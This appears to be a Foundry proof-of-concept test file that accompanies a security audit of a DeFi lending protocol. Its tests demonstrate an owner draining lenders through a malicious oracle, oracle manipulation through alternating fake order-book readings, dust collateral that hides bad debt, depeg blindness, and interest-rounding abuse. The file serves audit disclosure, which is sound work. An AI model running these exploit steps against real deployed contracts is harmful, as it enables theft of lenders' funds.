// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// Proof-of-concept tests for AUDIT.md. Each test PASSES while the weakness exists (it asserts the bad
// outcome). They are kept out of the normal suite: copy into test/ to run
//   cp audit/AuditPoC.t.sol test/ && forge test --match-path test/AuditPoC.t.sol -vv
import {BaseTest} from "./BaseTest.sol";
import {CreditPriceOracle} from "../src/oracle/CreditPriceOracle.sol";
import {FixedPriceOracle} from "../src/oracle/FixedPriceOracle.sol";
import {MockOracle} from "./mocks/Mocks.sol";
import {MockOrbioExchange} from "./mocks/OracleMocks.sol";

contract AuditPoC is BaseTest {
    address internal attacker = makeAddr("attacker");
    address internal lender2 = makeAddr("lender2");

    // ============================================================================================
    // H-1: the deployer keeps full owner power until the timelock accepts ownership, and the owner
    //      can drain lenders through setOracle.
    // ============================================================================================
    function test_H1_ownerCanDrainLendersThroughSetOracle_evenWithOwnershipPending() public {
        _lend(lender, 100_000 * ONE_CREDIT);

        // Deploy.s.sol: transferOwnership(timelock) only makes the timelock the PENDING owner.
        address timelock = makeAddr("realTimelock");
        vm.prank(owner); // `owner` plays the deployer's hot key here
        cm.transferOwnership(timelock);
        assertEq(cm.owner(), owner, "deployer is still the owner");

        // A malicious oracle that says 1 atom of USDG is worth $1,000,000,000.
        MockOracle evil = new MockOracle();
        evil.setPrice(address(credit), 1e18);
        evil.setPrice(address(usdg), 1e33);
        evil.setPrice(address(orbio), 1e18);
        vm.prank(owner);
        cm.setOracle(evil); // no bounds, no delay

        _postCollateral(attacker, usdg, 1); // one atom
        uint256 take = 90_000 * ONE_CREDIT; // everything the 90% utilization cap allows
        _borrow(attacker, take);
        assertEq(credit.balanceOf(attacker), take, "attacker walked away with 90% of lender funds");
        assertEq(pool.maxWithdraw(lender), 10_000 * ONE_CREDIT, "lender can only get 10% back");
    }

    // ============================================================================================
    // H-2: activating (burning) borrowed $CREDIT does not trigger liquidation (AGENT.md §2, §5, §8).
    // ============================================================================================
    function test_H2_activationOfBorrowedCredit_doesNotTriggerLiquidation() public {
        _lend(lender, 10_000 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 1_000 * ONE_USDG);
        _borrow(borrower, 500 * ONE_CREDIT);

        vm.prank(borrower);
        credit.activate(500 * ONE_CREDIT); // burned into API balance: gone for good

        assertGe(_healthFactor(borrower), 1e18, "position still looks healthy");
        credit.mint(liquidator, 500 * ONE_CREDIT);
        vm.startPrank(liquidator);
        credit.approve(address(pool), 500 * ONE_CREDIT);
        vm.expectRevert(abi.encodeWithSignature("PositionHealthy()"));
        pool.liquidate(borrower, address(usdg), 500 * ONE_CREDIT, 0);
        vm.stopPrank();
    }

    // ============================================================================================
    // M-1: interleaving fake readings with honest ones makes EVERY reading "divergent", the oracle
    //      goes stale, and the settlement price snaps to $1 while the market is at $0.55.
    // ============================================================================================
    function test_M1_attackerForcesOracleStale_settlementSnapsToOneDollar() public {
        MockOrbioExchange book = new MockOrbioExchange(address(credit));
        CreditPriceOracle po =
            new CreditPriceOracle(book, oracle, 5_000e6, 5 minutes, 1 hours, 2 hours, 2_500, 200);

        // Steady honest market at $0.55 for 40 hours.
        for (uint256 i; i < 40 * 12; ++i) {
            vm.warp(block.timestamp + 5 minutes);
            book.setPrice(5_000e6, 0.55e18, 0);
            po.update();
        }
        assertEq(po.getPrice(address(credit)), 0.55e18);

        // Attacker takes every OTHER slot with a fake ask placed and cancelled in one transaction.
        // Each honest reading diverges from the fake one before it, and vice versa: nothing is recorded.
        uint256 accepted;
        for (uint256 i; i < 30; ++i) {
            vm.warp(block.timestamp + 5 minutes);
            book.setPrice(5_000e6, i % 2 == 0 ? 0.10e18 : 0.55e18, 0); // attacker, then honest agent
            (CreditPriceOracle.ReadingStatus s,) = po.update();
            if (s == CreditPriceOracle.ReadingStatus.Accepted || s == CreditPriceOracle.ReadingStatus.Clamped) {
                ++accepted;
            }
        }
        assertEq(accepted, 0, "no honest reading got through in 2.5 hours");
        assertFalse(po.isFresh());
        assertEq(po.getPrice(address(credit)), 1e18, "settlement price is now $1 though the book says $0.55");

        // Wire it into the market: an unhealthy borrower is liquidated at $1, not $0.55.
        vm.prank(owner);
        cm.setOracle(po);
        _lend(lender, 10_000 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 1_000 * ONE_USDG);
        _borrow(borrower, 700 * ONE_CREDIT);
        oracle.setPrice(address(usdg), 0.85e18); // HF = 0.85*1000*0.8/700 = 0.97
        (uint256 repaid, uint256 seized) = _liquidate(borrower, address(usdg), 350 * ONE_CREDIT);
        // 350 CREDIT bought at $0.55 = $192.50; collateral received = 350 * $1 * 1.05 / 0.85 USDG.
        assertEq(repaid, 350 * ONE_CREDIT);
        assertEq(seized, (350 * ONE_USDG * 105 * 100) / (100 * 85), "seized at $1");
        emit log_named_uint("USDG seized at $1 settlement", seized);
        emit log_named_uint("USDG that $0.55 settlement would seize", (seized * 55) / 100);
    }

    // ============================================================================================
    // M-2: one atom of collateral, sent by anyone, stops bad debt from being written off. The loss
    //      stays hidden in the share price, so the first lender out escapes and the last pays.
    // ============================================================================================
    function test_M2_dustCollateralHidesBadDebt_firstLenderOutEscapes() public {
        _lend(lender, 1_000 * ONE_CREDIT);
        _lend(lender2, 1_000 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 1_000 * ONE_USDG);
        _borrow(borrower, 700 * ONE_CREDIT);

        // USDG loses half its value: collateral $500 < debt 700.
        oracle.setPrice(address(usdg), 0.5e18);

        // Front-run: lender (or anyone) gives the borrower 1 wei of ORBIO.
        orbio.mint(lender, 1);
        vm.startPrank(lender);
        orbio.approve(address(pool), 1);
        pool.depositCollateral(address(orbio), 1, borrower);
        vm.stopPrank();

        // Liquidation takes all the USDG; debt remains, but the borrower still "has collateral".
        _liquidate(borrower, address(usdg), 700 * ONE_CREDIT);
        uint256 leftover = pool.debtOf(borrower);
        assertGt(leftover, 200 * ONE_CREDIT, "unrecoverable debt left on the books");
        assertEq(pool.collateralOf(borrower, address(usdg)), 0);

        // The pool still counts that debt as an asset; the first lender redeems at full value.
        uint256 shares = pool.balanceOf(lender);
        vm.prank(lender);
        uint256 got = pool.redeem(shares, lender, lender);
        assertApproxEqAbs(got, 1_000 * ONE_CREDIT, 1, "first lender out gets everything back");
        // Everything that is left for lender2 is the uncollectable debt plus the remaining cash.
        emit log_named_uint("lender2 claim (CREDIT atoms)", pool.convertToAssets(pool.balanceOf(lender2)));
        emit log_named_uint("of which uncollectable debt", leftover);
    }

    /// Control for M-2: the same scenario WITHOUT the dust. The loss is written off at liquidation and
    /// both lenders share it equally.
    function test_M2_control_withoutDust_badDebtIsWrittenOffAndShared() public {
        _lend(lender, 1_000 * ONE_CREDIT);
        _lend(lender2, 1_000 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 1_000 * ONE_USDG);
        _borrow(borrower, 700 * ONE_CREDIT);
        oracle.setPrice(address(usdg), 0.5e18);
        _liquidate(borrower, address(usdg), 700 * ONE_CREDIT);
        assertEq(pool.debtOf(borrower), 0, "bad debt realized");
        uint256 shares = pool.balanceOf(lender);
        vm.prank(lender);
        uint256 got = pool.redeem(shares, lender, lender);
        assertLt(got, 900 * ONE_CREDIT, "first lender takes their half of the loss");
    }

    // ============================================================================================
    // M-3: USDG is priced at a hard-coded $1 forever, so a depeg is invisible.
    // ============================================================================================
    function test_M3_fixedUsdgPrice_cannotSeeADepeg() public {
        address[] memory a = new address[](3);
        a[0] = address(credit);
        a[1] = address(usdg);
        a[2] = address(orbio);
        uint256[] memory p = new uint256[](3);
        (p[0], p[1], p[2]) = (1e18, 1e18, 1e18);
        FixedPriceOracle fixedOracle = new FixedPriceOracle(a, p); // what Deploy.s.sol uses for USDG
        vm.prank(owner);
        cm.setOracle(fixedOracle);

        _lend(lender, 10_000 * ONE_CREDIT);
        // Suppose USDG trades at $0.40. Attacker buys 1,000 USDG for $400 and borrows 699 CREDIT
        // (counted at $1 for health, so worth more than the collateral at any CREDIT price above $0.57).
        _postCollateral(attacker, usdg, 1_000 * ONE_USDG);
        _borrow(attacker, 699 * ONE_CREDIT);
        assertEq(cm.getPrice(address(usdg)), 1e18, "oracle still says $1");
        assertGt(_healthFactor(attacker), 1e18, "never liquidatable, even though collateral is worth $400");
    }

    // ============================================================================================
    // L-1: interest on totalBorrows rounds down to zero each second in a small market. Anyone can call
    //      accrueInterest() every second; debts keep growing, the lenders' share price does not.
    // ============================================================================================
    function test_L1_frequentAccrual_suppressesLenderInterest() public {
        _lend(lender, 100 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 100 * ONE_USDG);
        _borrow(borrower, 50 * ONE_CREDIT);
        uint256 assetsBefore = pool.totalAssets();
        uint256 borrowsBefore = pool.totalBorrows();

        for (uint256 i; i < 3_600; ++i) {
            vm.warp(block.timestamp + 1);
            pool.accrueInterest(); // permissionless; costs the caller only gas
        }

        assertEq(pool.totalBorrows(), borrowsBefore, "an hour of interest never reached totalBorrows");
        assertEq(pool.totalAssets(), assetsBefore, "lenders' share price did not move");
        assertGt(pool.debtOf(borrower), 50 * ONE_CREDIT, "but the borrower's debt did grow");
    }

    // ============================================================================================
    // L-3: after a crash from $0.55 to $0.30, liquidations are still sized near $0.55 six hours later.
    // ============================================================================================
    function test_L3_liquidationPayLagsACrash() public {
        MockOrbioExchange book = new MockOrbioExchange(address(credit));
        CreditPriceOracle po =
            new CreditPriceOracle(book, oracle, 5_000e6, 5 minutes, 1 hours, 2 hours, 2_500, 200);
        for (uint256 i; i < 40 * 12; ++i) {
            vm.warp(block.timestamp + 5 minutes);
            book.setPrice(5_000e6, 0.55e18, 0);
            po.update();
        }
        for (uint256 i; i < 6 * 12; ++i) {
            vm.warp(block.timestamp + 5 minutes);
            book.setPrice(5_000e6, 0.30e18, 0); // the real market, every reading honest
            po.update();
        }
        uint256 settlement = po.getPrice(address(credit));
        assertGe(settlement, 0.48e18, "six hours after the crash, liquidations still pay as if CREDIT were $0.48+");
        // A liquidator buying at $0.30 receives collateral sized at `settlement` (+5% bonus):
        assertGe((settlement * 100) / 0.30e18, 160, "at least 1.6x what the market price justifies");
        emit log_named_uint("settlement price after 6h (WAD)", settlement);
    }

    // ============================================================================================
    // L-2: repaying can leave a debt far below minDebt (the minimum only applies to borrowing).
    // ============================================================================================
    function test_L2_repayLeavesDustBelowMinDebt() public {
        _lend(lender, 1_000 * ONE_CREDIT);
        _postCollateral(borrower, usdg, 100 * ONE_USDG);
        _borrow(borrower, 10 * ONE_CREDIT);
        vm.startPrank(borrower);
        credit.approve(address(pool), type(uint256).max);
        pool.repay(10 * ONE_CREDIT - 1, borrower);
        vm.stopPrank();
        assertEq(pool.debtOf(borrower), 1, "1-atom debt that no liquidator will ever touch");
        assertLt(pool.debtOf(borrower), pool.minDebt());
    }
}
